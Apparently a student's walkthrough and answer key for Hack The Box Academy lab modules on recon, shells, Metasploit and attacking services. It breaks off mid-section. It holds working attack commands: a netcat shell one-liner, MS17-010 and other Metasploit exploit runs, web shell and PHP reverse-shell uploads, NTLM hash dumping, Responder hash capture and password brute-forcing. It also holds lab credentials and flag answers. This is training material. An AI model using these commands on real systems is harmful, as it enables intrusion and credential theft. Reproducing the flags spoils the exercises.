Results: smtpin.vvv.facebook.com
#### Subdomain BruteForcing

**Using the known subdomains for inlanefreight.com (www, ns1, ns2, ns3, blog, support, customer), find any missing subdomains by brute-forcing possible domain names. Prov**ide your answer with the complete subdomain, e.g., www.inlanefreight.com.

```
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```

Results: my.inlanefreight.com

#### DNS Zone Transfers

**After performing a zone transfer for the domain inlanefreight.htb on the target system, how many DNS records are retrieved from the target system's name server? Provide your answer as an integer, e.g, 123.**

```
dig axfr inlanefreight.htb @$ip 
```

```
# Response
; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.72.193
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
admin.inlanefreight.htb. 604800	IN	A	10.10.34.2
ftp.admin.inlanefreight.htb. 604800 IN	A	10.10.34.2
careers.inlanefreight.htb. 604800 IN	A	10.10.34.50
dc1.inlanefreight.htb.	604800	IN	A	10.10.34.16
dc2.inlanefreight.htb.	604800	IN	A	10.10.34.11
internal.inlanefreight.htb. 604800 IN	A	127.0.0.1
admin.internal.inlanefreight.htb. 604800 IN A	10.10.1.11
wsus.internal.inlanefreight.htb. 604800	IN A	10.10.1.240
ir.inlanefreight.htb.	604800	IN	A	10.10.45.5
dev.ir.inlanefreight.htb. 604800 IN	A	10.10.45.6
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
resources.inlanefreight.htb. 604800 IN	A	10.10.34.100
securemessaging.inlanefreight.htb. 604800 IN A	10.10.34.52
test1.inlanefreight.htb. 604800	IN	A	10.10.34.101
us.inlanefreight.htb.	604800	IN	A	10.10.200.5
cluster14.us.inlanefreight.htb.	604800 IN A	10.10.200.14
messagecenter.us.inlanefreight.htb. 604800 IN A	10.10.200.10
ww02.inlanefreight.htb.	604800	IN	A	10.10.34.112
www1.inlanefreight.htb.	604800	IN	A	10.10.34.111
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 540 msec
;; SERVER: 10.129.72.193#53(10.129.72.193) (TCP)
;; WHEN: Tue Sep 10 15:25:16 EDT 2024
;; XFR size: 22 records (messages 1, bytes 594)
```


Results: 22

**Within the zone record transferred above, find the ip address for ftp.admin.inlanefreight.htb. Respond only with the IP address, eg 127.0.0.1**

Results:  10.10.34.2

**Within the same zone record, identify the largest IP address allocated within the 10.10.200 IP range. Respond with the full IP address, eg 10.10.200.1**

Results:  10.10.200.14

#### Virtual Hosts

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "web"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Important, the --append-domain part

```
gobuster vhost -u http://$domain:$port/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Results: web17611.inlanefreight.htb

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "vm"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: vm5.inlanefreight.htb

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "br"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: browser.inlanefreight.htb


**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "a"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: admin.inlanefreight.htb


**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "su"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: support.inlanefreight.htb

### Fingerprinting

#### Fingerprinting

**Determine the Apache version running on app.inlanefreight.local on the target system. (Format: 0.0.0)**

```
sudo echo $ip app.inlanefreight.local >> /etc/hosts
curl -I app.inlanefreight.local
```

Results: 2.4.41B



**Which CMS is used on app.inlanefreight.local on the target system? Respond with the name only, e.g., WordPress.**

```
whatweb http://app.inlanefreight.local
```

Results: Joomla


**On which operating system is the dev.inlanefreight.local webserver running in the target system? Respond with the name only, e.g., Debian.**

Results: Ubuntu 

### Crawling

#### Creepy crawlies

**After spidering inlanefreight.com, identify the location where future reports will be stored. Respond with the full domain, e.g., files.inlanefreight.com.**

```
python3 ReconSpider.py https://inlanefreight.com
```

Results: inlanefreight-comp133.s3.amazonaws.htb

### Web Archives


**How many Pen Testing Labs did HackTheBox have on the 8th August 2018? Answer with an integer, eg 1234.**

Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/

Results: 74

**How many members did HackTheBox have on the 10th June 2017? Answer with an integer, eg 1234.**

Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/

Results: 3054

**Going back to March 2002, what website did the facebook.com domain redirect too? Answer with the full domain, eg http://www.facebook.com/**

Go to https://web.archive.org/web/20020601000000*/www.facebook.com

Results:  http://site.aboutface.com/

**According to the paypal.com website in October 1999, what could you use to "beam money to anyone"? Answer with the product name, eg My Device, remove the ™ from your answer.**

Go to https://web.archive.org/web/19991013140707/http://paypal.com/

Results: Palm 0rganizer

**Going back to November 1998 on google.com, what address hosted the non-alpha "Google Search Engine Prototype" of Google? Answer with the full address, eg http://google.com**

Go to https://web.archive.org/web/19981111184551/http://google.com/

Results: http://google.stanford.edu/


**Going back to March 2000 on www.iana.org, when exacty was the site last updated? Answer with the date in the footer, eg 11-March-99**

Go to https://web.archive.org/web/20000303211237/http://www.iana.org/

Results: 17-December-99


**According to the wikipedia.com snapshot taken in March 2001, how many pages did they have over? Answer with the number they state without any commas, eg 2000 not 2,000**

Go to https://web.archive.org/web/20010331173908/http://www.wikipedia.com/

Results: 3000


### Skills Assessment

**What is the IANA ID of the registrar of the inlanefreight.com domain?**

```
whois inlanefreight.com
```

Results: 468


**What http server software is powering the inlanefreight.htb site on the target system? Respond with the name of the software, not the version, e.g., Apache.**

```
curl -I $ip:$port
```

Results: nginx


**What is the API key in the hidden admin directory that you have discovered on the target system?**

```
# 1. Add $ip inlanefreight.htb to /etc/hosts

# 2. Create variable $port

# 3. Do a vhost scan. For instance
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H "HOST:FUZZ.inlanefreight.htb" -fs 120

# 4. Add the discovered VHOST to /etc/hosts

# 5. Enumerate the site 
dirb http://web1337.inlanefreight.htb:$port

# 6. There is a robots.txt file in the results, with a hiden admin panel. Trying to access directly the panel returns a 404. However we could try to fuzz it deeper:
ffuf -recursion -recursion-depth 1 -u http://web1337.inlanefreight.htb:53178/admin_h1dd3n/FUZZ -w /usr/share/seclists//Discovery/Web-Content/common.txt

# 7. There is one result: index.html. Go to http://web1337.inlanefreight.htb:$port/admin_h1dd3n/index.html to retrieve the flag.


```

Results:  e963d863ee0e82ba7080fbf558ca0d3f

 **After crawling the inlanefreight.htb domain on the target system, what is the email address you have found? Respond with the full email, e.g., mail@inlanefreight.htb.**

```
# 1. Following the previous question, additional vhost discovery could be done:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H "HOST:FUZZ.web1337.inlanefreight.htb" -fs 120
# Add the second discovered VHOST (`dev`) to /etc/host, and visit the site http://dev.web1337.inlanefreight.htb/index.html. Notice that there is a next button, that takes you to a http://dev.web1337.inlanefreight.htb/index-123.html. Set-up an intruder attack with Numbered payload

```

![pay](img/payload_00.png)

![pay](img/payload_02.png)

Results:   1337testing@inlanefreight.htb


**What is the API key the inlanefreight.htb developers will be changing too?**


![pay](img/payload_01.png)

Results: ba988b835be4aa97d068941dc852ff33




## [Vulnerability Assessment](https://academy.hackthebox.com/module/details/108)

### Nesus

#### Nessus Skills assessment

 
**What is the name of one of the accessible SMB shares from the authenticated Windows scan? (One word)**

Authenticate to port 22  with user "htb-student" and password "HTB_@cademy_student!". Start nessus and go to the IP:8834 url. Have a look at the windows scan.

Results: wsus


**What was the target for the authenticated scan?** 

Results: 172.16.16.100


**What is the plugin ID of the highest criticality vulnerability for the Windows authenticated scan?** 

Results: 156032



 **What is the name of the vulnerability with plugin ID 26925 from the Windows authenticated scan? (Case sensitive)**

Results:   VNC Server Unauthenticated Access



 **What port is the VNC server running on in the authenticated Windows scan?**


Results:  5900


### Openvass

#### Openvass Skills assessment

**What type of operating system is the Linux host running? (one word)**

Results:  Ubuntu


**What type of FTP vulnerability is on the Linux host? (Case Sensitive, four words)**

Results:  Anonymous FTP Login Reporting


**What is the IP of the Linux host targeted for the scan?**

Results:  172.16.16.160


**What vulnerability is associated with the HTTP server? (Case-sensitive)**

Results:  Cleartext Transmission of Sensitive Information via HTTP

## [File Transfers](https://academy.hackthebox.com/module/details/24)

### Windows File Transfer methods

**Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.**

```bash
curl http://$ip:80/flag.txt
```

Results:  b1a4ca918282fcd96004565521944a3b

RDP to 10.129.201.55 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!".
**Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.**

```
# First download the file to your kali. Second, run a server, for instance this PHP server
sudo php -S 0.0.0.0:80

# Launch a RDP connection
xfreerdp /cert:ignore /u:$user /p:$pass /v:$ip

# In the windows machine, open Powershell and retrieve the file:
(New-Object Net.WebClient).DownloadFile('http://$ip/upload_win.zip','C:\Users\htb-student\Desktop\upload_win.zip')

# Unzip it in the Desktop. Open cmd and run:
hasher C:\Users\htb-student\Desktop\upload_win\upload_win.txt
```

Results:  f458303ea783c224c6b4e7ef7f17eb9d


### Linux File Transfer methods

**Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.**

```
wget -O flag.txt http://$ip/flag.txt
```

Results:  5d21cf3da9c0ccb94f709e2559f3ea50

**SSH to 10.129.206.169 (ACADEMY-MISC-NIX04) with user "htb-student" and password "HTB_@cademy_stdnt!". Upload the attached file named upload_nix.zip to the target using the method of your choice. Once uploaded, SSH to the box, extract the file, and run "hasher `<extracted file>`" from the command line. Submit the generated hash as your answer.**

```
scp upload_nix.zip htb-student@$ip:/tmp
# Enter the htb-student password

# Unzip file
python3 -m zipfile -e  upload_nix.zip .
# Or
 gunzip -S .zip upload_nix.zip

# hash it
hasher upload_nix.txt
```

Results:  159cfe5c65054bbadb2761cfa359c8b0




## [Shells & Payloads](https://academy.hackthebox.com/module/details/115)

### Shell Basics

**Which two shell languages did we experiment with in this section? (Format: shellname&shellname)**

Results:  bash&powershell

 **In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer.**
Results:  Core

**Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?**

Results:  443


**SSH to $ipVictim with user "htb-student" and password "HTB_@cademy_stdnt!". Create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.**

```
# Connect via ssh with victim's machine. In the attacker machine:
ssh htb-student@$ipVictim
# enter password. Now, in the same terminal set the listener:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $ipVictim $port > /tmp/f

# In the attacker terminal:
nc $ipVictim $port
cat /customscripts/flag.txt
```

Results:  B1nD_Shells_r_cool


**When establishing a reverse shell session with a target, will the target act as a client or server?**
Results:  Client

**Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.**

Results:  Shells-Win10


### Payloads

**What command language interpreter is used to establish a system shell session with the target?**

Results:  powershell

**Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)**

```
msfconsole -q
use exploit/windows/smb/psexec
show info
set RHOSTS ...
set LHOST ...
set SMBPass HTB_@cademy_stdnt!  
set SMBUser htb-student
set SMBSHARE ADMIN$
run

dir C:\Users\htb-student\Documents>
```

Results:  staffsalaries.txt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::


### Windows Shells

**What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')**

Results:  .bat


**What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)**

Results:  MS17-010


 **Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\**

```
sudo nmap -sC -sV -O $ip -Pn
msfconsole -q

search MS17-010
use windows/smb/ms17_010_psexec
set RHOSTS...
set SHARE ADMIN$
set LHOST
run
```

Results:  EB-Still-W0rk$



### NIX Shells

**What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?**

Results:  php

 Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.

```
sudo nmap -sC -sV -v $ip -Pn

# Enter ip in the browser and discover rConfig Version 3.9.6 

msfconsole -q
search rConfig
use linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS
set LHOST
run

ls -la /devicedetails
cat /devicedetails/hostnameinfo.txt
cat /devicedetails/edgerouter-isp.yml
```

Results:  edgerouter-isp
### Web Shells

#### laudanum
vHosts needed for these questions: `status.inlanefreight.local`
Establish a web shell session with the target using the concepts covered in this section. Submit the full path of the directory you land in. (Format: c:\path\you\land\in)

```shell-session
sudo nmap -sC -sV $ip

# Add "$ip status.inlanefreight.local" to /etc/hosts
# browse to status.inlanefreight.local
# Infer that aspx is in use.
# Notice the upload file feature by the end of the page

# Copy the file you want to use from laudanum repo to where you want to use it from:
cp /usr/share/laudanum/aspx/shell.aspx /your/path/laudanum.aspx
# In this case I'm selecting an aspx shell. There are other types.
```

Modify the shell to use. Add to the whitelisting rule your ip.

![laudanum](img/laudanum2.png)

Upload the file to the web server.

Once uploaded, go to http://status.inlanefreight.local//file/laudanum.aspx which is your uploaded file. You will see something like:

![laudanum](img/laudanum.png)


```
dir
```

Results:  c:\windows\system32\inetsrv


Where is the Laudanum aspx web shell located on Pwnbox? Submit the full path. (Format: /path/to/laudanum/aspx)

```
# Spawn Pwnbox and open a Parrot terminal
locate laudanum
```

Results:  /usr/share/laudanum/aspx/shell.aspx

#### antak webshell

**vHosts needed for these questions: `status.inlanefreight.local`. Where is the Antak webshell located on Pwnbox? Submit the full path. (Format:/path/to/antakwebshell)**

```
# Spawn Pwnbox and open a Parrot terminal
locate antak
```

Results:  /usr/share/nishang/Antak-WebShell/antak.aspx


**Establish a web shell with the target using the concepts covered in this section. Submit the name of the user on the target that the commands are being issued as. In order to get the correct answer you must navigate to the web shell you upload using the vHost name. (Format: **\**, 1 space)**



```shell-session
# First step, generate the file you will upload:
sudo cp /usr/share/nishang/Antak-WebShell/antak.aspx /path/Upload.aspx
```

Set credentials for access to the web shell. Modify `line 14`, adding a user and password.

![antak](img/antak.png)

Open the browser and upload the file to the web app.  Open the url  //files/Upload.aspx and enter user and password.

![antak2](img/antak2.png)

Now that we have access, we can utilize PowerShell commands to navigate and take actions against the host.

```
whoami
```

Results:  iis apppool\status

#### php shells

**In the example shown, what must the Content-Type be changed to in order to successfully upload the web shell? (Format: .../...)**

Results:  image/gif


**Use what you learned from the module to gain a web shell. What is the file name of the gif in the /images/vendor directory on the target? (Format: xxxx.gif)**

```
# Access the site and enter credentials admin:admin
# Go to devices > vendor 
# Intercept the uploading of the logo
# Use https://www.revshells.com/ -> PHP Ivan Sincek
# Modifify the file to contain attacker ip and port
# Upload it. Bypass content-type. Leave image/gif. Leave in the intercepted payload the PHP extensionin filename.
# Set a netcat listener
nc -lnvp 1234
# Trigger the uploaded file from https://$ip/images/vendor/nameOfUploadedFile.php
# You will get the reverse shell. List files
ls -la
```

Results:  ajax-loader.gif


### Skills Assessment

CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.1.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

10.129.213.83


**What is the hostname of Host-1? (Format: all lower case)**

```
# Connect to the parrot machine
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!

# Open a terminal and scan ip range 172.16.1.0/23
nmap 172.16.1.0/23

# Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:
sudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080

# The hostname is displayed
```

Results:  SHELLS-WINSVR



**Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)**

```
# The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.
# One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:
msfconsole -q
search tomcat
use multi/http/tomcat_mgr_upload
set RHOSTS 172.16.1.11
set RPORT 8080
set target Windows Universal
set payload payload/generic/shell_reverse_tcp 
# After gaining access, go to c:\Shares
dir
```

Results:   dev-share


**What distribution of Linux is running on Host-2? (Format: distro name, all lower case)**

```
nmap -A 172.16.1.12 -p22,80
```

Results:  Ubuntu


**What language is the shell written in that gets uploaded when using the 50064.rb exploit?**

Results:  php


**Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt**

```
# Open firefox writting in the terminal
firefox

# Open the blog in scope http://blog.inlinefreight.local and click on login
# Enter the creds from the access-creds.txt file: admin:admin123!@#
# The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)
# Open a terminal on the Parrot:
searchsploit Lightweight
# You will see 
Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb

# Print the path
searchsploit -m php/webapps/50064.rb

# Create the folders
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/
sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Copy the exploit
sudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/

# Reload all modules
reload_all

# Now when searching for Lightweight, we could access the exploit
search Lightweight
use exploit/php/webapps/50064
options
set RHOSTS 172.16.1.12
set TARGETURI /
set VHOST blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
run
cat /customscripts/flag.txt
```

Results:  B1nD_Shells_r_cool


**What is the hostname of Host-3?**

```
sudo nmap -A 172.16.1.13 -p80,135,139,445
```

Results:  SHELLS-WINBLUE

**Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt**

```
msfconsole -q
use exploit/windows/smb/ms17_010_psexec
SET RHOSTS 172.16.1.13
SET LHOST 172.16.1.5
run 
shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

Results:  One-H0st-Down!



## [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)

### Introduction to Metasploit

**Which version of Metasploit comes equipped with a GUI interface?**

Results: Metasploit Pro


**What command do you use to interact with the free version of Metasploit?**

Results: msfconsole

### MSF Components

**Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.**

```
msfconsole -q

search EternalRomance
use exploit/windows/smb/ms17_010_psexec

#set options, run, and obtain a meterpreter
shell
type C:/Users/Administrator/Desktop/flag.txt
```

Results: HTB{MSF-W1nD0w5-3xPL01t4t10n}


**Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.**

```
sudo nmap -sC -sV $ip -Pn 
```

```
# From results you have
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
8081/tcp open  http    Jetty 9.4.12.v20180830
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8081/unified-console.html
|_http-server-header: Jetty(9.4.12.v20180830)
8082/tcp open  http    Jetty 9.4.12.v20180830
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.12.v20180830)
8083/tcp open  http    Jetty 9.4.12.v20180830
|_http-server-header: Jetty(9.4.12.v20180830)
|_http-title: Site doesn't have a title.
8888/tcp open  http    Jetty 9.4.12.v20180830
|_http-server-header: Jetty(9.4.12.v20180830)
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8888/unified-console.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
# Now
msfconsole -q
search apache druid
use linux/http/apache_druid_js_rce
# set RHOSTS, LHOST, etc and run it to obtain a meterpreter

shell
pwd
cd ..
cat flag.txt

```

Results: HTB{MSF_Expl01t4t10n}


### MSF Sessions

**The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?**

Results: elFinder


**Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?**

```
msfconsole -q
workspace -a lala
db_nmap -sC -sV $ip
search elfinder
use linux/http/elfinder_archive_cmd_injection
# SET RHOSTS, SET LHOST...
run
getuid
```

Results: www-data



**The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.**

```
# In the previous session, run
sudo -V
```

```
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

After searching in google, we find CVE-2021-3156:

```
search CVE-2021-3156
options
# SET SESSION 2, SET LHOST, SET RHOSTS
run
shell
cat /root/flag.txt
```

Results: HTB{5e55ion5_4r3_sw33t}


Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```
msfconsole -q
db_nmap -sC -sV -p- $ip
```

From response pay attention to port 5000:

```
Nmap: PORT      STATE SERVICE       VERSION
[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds?
[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: |_ssl-date: 2024-09-23T19:38:10+00:00; 0s from scanner time.
[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
[*] Nmap: | Not valid before: 2024-09-22T19:35:32
[*] Nmap: |_Not valid after:  2025-03-24T19:35:32
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   Product_Version: 10.0.17763
[*] Nmap: |_  System_Time: 2024-09-23T19:38:02+00:00
[*] Nmap: 5000/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
[*] Nmap: |_http-title: FortiLogger | Log and Report System
[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-title: Not Found
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: |_http-title: Not Found
[*] Nmap: 49664/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49665/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49666/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49667/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49668/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49669/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49670/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49671/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2024-09-23T19:38:06
[*] Nmap: |_  start_date: N/A
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

After visiting $ip:5000 you can see the Fortilogger service. 

```
search fortilogger
use exploit/windows/http/fortilogger_arbitrary_fileupload
# SET LHOST, RHOSTS...
run 
getuid
```

Results: NT AUTHORITY\SYSTEM
 

Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

```
lsa_dump_sam
```

```
... CUT ...
RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
... CUT ...

```

Results: cf3a5525ee9414229e66279623ed5c58

## [Password Attacks](https://academy.hackthebox.com/module/details/147)

## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)

### FTP

**What port is the FTP service running on?**

```
sudo nmap -sC -sV $ip -Pn -p-
```

Results: 2121

**What username is available for the FTP server?**

```
# Footprint the service and check out that anonymous user is enabled. Login into the ftp service and download the userlist and password list. After that...

# Two ways:
medusa -U users.list  -P pws.list -h $ip  -M ftp -n 2121
hydra -L users.list  -P pws.list ftp://$ip:2121 
```

Results:  robin

**Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.**

```
ssh robin@$ip
cat flag.txt
```

Results: HTB{ATT4CK1NG_F7P_53RV1C3}


### SMB

**What is the name of the shared folder with READ permissions?**

```
smbmap -H $ip
```

Results: GGJ

**What is the password for the username "jason"?**

```
sudo nmap -sC -sV $ip -Pn
# Results 22,53, 139,445,2121

ftp $ip 2121
# Enter anonymous and anonymous

# Download files
mget *.list

# Checksmb services
smbmap -H //
smbclient //$ip/GGJ -N
smbclient //$ip/GGJ -N -r

# However, downloading the id_rsa file is not possible due to permissions. 
smbmap -H  $ip --download GGJ/id_rsa  //NOT WORKING 

# We will download from resources pwd.list and launch a brute for attack 
crackmapexec smb $ip -u jason -p pws.list  -d ATTCSVC-LINUX
```

Results: 34c8zuNBo91!@28Bszh

**Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**

```
# Log in as jason
smbclient  //$ip/GGJ -U jason
#Enter password
get id_rsa
quit

chmod 600 id_rsa
ssh -i id_rsa jason@$ip
cat flag.txt
```

Results: HTB{SMB_4TT4CKS_2349872359}

### SQL Databases
Authenticate to $ip with user "htbdbuser" and password "MSSQLAccess01!"

**What is the password for the "mssqlsvc" user?**

```
# Connect to the db using mssqlclient impacket
mssqlclient.py -p 1433 htbdbuser@$ip
# Enter creds when prompted

# Whoami
select user_name();

# List users:
SELECT name FROM master..syslogins
# The one we are looking for is not present.

# We will try to capture MSSQL Service Hash by using `xp_dirtree` undocumented stored procedures.
# In our attacker machine open a new terminal and set a responder listener
sudo responder -I tun0

# In the already connected mssql command line: 
EXEC master..xp_dirtree '\\$ipAttacker\share'

# The responder listener will print:
NTLMv2-SSP Hash     : mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000

# Let's save it to a file
echo "mssqlsvc::WIN-02:5b55e0dc6b4e012d:9061B752E27B9DC08B778088A813DDF6:0101000000000000801A85C76927DB01E0A642B53DA7BF6000000000020008004A00420059004F0001001E00570049004E002D0037003500460059004F0055004F00540052004F00360004003400570049004E002D0037003500460059004F0055004F00540052004F0036002E004A00420059004F002E004C004F00430041004C00030014004A00420059004F002E004C004F00430041004C00050014004A00420059004F002E004C004F00430041004C0007000800801A85C76927DB0106000400020000000800300030000000000000000000000000300000ABE564474E572C0FDA65F14FE47C49910CF6D5E2D84E98065E4910B32B2B9D850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380034000000000000000000" > hash.txt

# And now... crack it with John the ripper
 john -w=/usr/share/wordlists/rockyou.txt hash.txt
 ```

Results: princess1


**Enumerate the "flagDB" database and submit a flag as your answer.**

```
# We know that user mssqlsvc:princess1 is part of the windows authentication, so we login into the service with those creds:
mssqlclient.py -p 1433 mssqlsvc@$ip -windows-auth
# and enter the password

